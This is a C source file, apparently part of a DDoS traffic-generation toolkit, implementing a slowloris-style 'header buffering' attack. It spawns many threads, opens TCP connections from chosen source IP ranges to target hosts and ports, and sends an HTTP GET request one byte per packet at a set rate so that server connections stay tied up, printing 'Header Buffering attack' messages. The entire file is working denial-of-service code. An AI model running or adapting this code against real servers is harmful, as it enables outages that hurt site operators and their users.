#include "header.h"
#include "base/make_ipv4.h"
#include "base/make_tcp.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/header_buffering.h"

#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
#define GET_METHOD_LEN 50
extern int g_num_threads;

// session counting
__u64 g_headbuf_num_total;
__u64 g_headbuf_num_generated_in_sec;
// from main()
unsigned char g_headbuf_src_ip[16] = { 0, };
unsigned char g_headbuf_dest_ip[16] = { 0, };
__u32 g_headbuf_src_mask;
__u32 g_headbuf_dest_mask;
__u32 g_headbuf_dest_port_start;
__u32 g_headbuf_dest_port_end;
__u32 g_headbuf_request_per_sec;
// for masking next ip address
unsigned char g_headbuf_now_src_ip[16];
unsigned char g_headbuf_now_dest_ip[16];
__u32 g_headbuf_now_dest_port;
// thread
pthread_mutex_t g_headbuf_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_headbuf_cond = PTHREAD_COND_INITIALIZER;
// time checking
struct timespec g_headbuf_before_time;
struct timespec g_headbuf_now_time;


void header_buffering_print_usage(void)
{
	printf(
			"header buffering Usage : "
			"[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
	return;
}

void *generate_header_buffering(void *data)
{
	int thread_id = *((int*) data);
	//make tcp connection
	int sock = -1;
	int src_port, seq, ack;
	int head_buffering_cnt=0;
	int index=0;


	char get_method[GET_METHOD_LEN];
	strcpy(get_method,"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");

	int get_method_len = strlen(get_method);
	printf("LEN : %d\n",get_method_len);

	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_headbuf_mutex);
		// making tcp connection

			// get now resource
			generator(
					g_headbuf_src_ip,
					g_headbuf_dest_ip,
					g_headbuf_src_mask,
					g_headbuf_dest_mask,
					g_headbuf_dest_port_start,
					g_headbuf_dest_port_end,
					g_headbuf_now_src_ip,
					g_headbuf_now_dest_ip,
					&g_headbuf_now_dest_port);
		if(head_buffering_cnt % get_method_len==0)
		{
			if(sock!=-1) close(sock);
			sock = tcp_make_connection(
					inet_addr(g_headbuf_now_src_ip),
					inet_addr(g_headbuf_now_dest_ip),
					&src_port,
					g_headbuf_now_dest_port,
					&seq,
					&ack,
					0);
			head_buffering_cnt=0;
			index=0;
		}

		// wait a second
		if (g_headbuf_num_generated_in_sec >= g_headbuf_request_per_sec) {
			pthread_cond_wait(&g_headbuf_cond, &g_headbuf_mutex);
		}
		// time checking
		time_check(
				&g_headbuf_cond,
				&g_headbuf_before_time,
				&g_headbuf_now_time,
				&g_headbuf_num_generated_in_sec);
		// send
		char data = get_method[index];
		tcp_socket_send_data_no_ack(
				sock,
				inet_addr(g_headbuf_now_src_ip),
				inet_addr(g_headbuf_now_dest_ip),
				src_port,
				g_headbuf_now_dest_port,
				&data,
				1,
				seq,
				ack,
				0);
		seq += 1;

		g_headbuf_num_generated_in_sec++;
		g_headbuf_num_total++;
		index++;
		head_buffering_cnt++;

		pthread_mutex_unlock(&g_headbuf_mutex);
	}
	return NULL;
}

void *header_buffering_time_check(void *data)
{
	while (1) {
		pthread_mutex_lock(&g_headbuf_mutex);
		time_check(
				&g_headbuf_cond,
				&g_headbuf_before_time,
				&g_headbuf_now_time,
				&g_headbuf_num_generated_in_sec);
		pthread_mutex_unlock(&g_headbuf_mutex);
	}
	return NULL;
}

void header_buffering_main(char *argv[])
{

	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 4) {
		header_buffering_print_usage();
		return;
	}
	split_ip_mask_port(
			argv,
			g_headbuf_src_ip,
			g_headbuf_dest_ip,
			&g_headbuf_src_mask,
			&g_headbuf_dest_mask,
			&g_headbuf_dest_port_start,
			&g_headbuf_dest_port_end);
	g_headbuf_num_generated_in_sec = 0;
	g_headbuf_num_total = 0;
	memset(&g_headbuf_before_time, 0, sizeof(struct timespec));
	memset(&g_headbuf_now_time, 0, sizeof(struct timespec));
	g_headbuf_request_per_sec = atoi(argv[3]);
	const int num_threads = g_num_threads;
	pthread_t threads[9999];
	int thread_ids[9999];
	for (int i = 0; i < num_threads; i++) {
		thread_ids[i] = i;
	}
	printf("Header Buffering attack to %s using %d threads\n",
			g_headbuf_dest_ip, num_threads);
	int i;
	for (i = 0; i < num_threads; i++) {
		pthread_create(
				&threads[i],
				NULL,
				generate_header_buffering,
				(void *)&thread_ids[i]);
	}
	pthread_create(&threads[i], NULL, header_buffering_time_check, NULL);
	for (int i = 0; i < num_threads; i++) {
		pthread_join(threads[i], NULL);
		printf("threads %d joined\n", i);
	}
	printf("Head Buffering attack finished\nTotal %lu packets sent.\n",
			g_headbuf_num_total);

	pthread_mutex_destroy(&g_headbuf_mutex);
	pthread_exit(NULL);
	return;
}
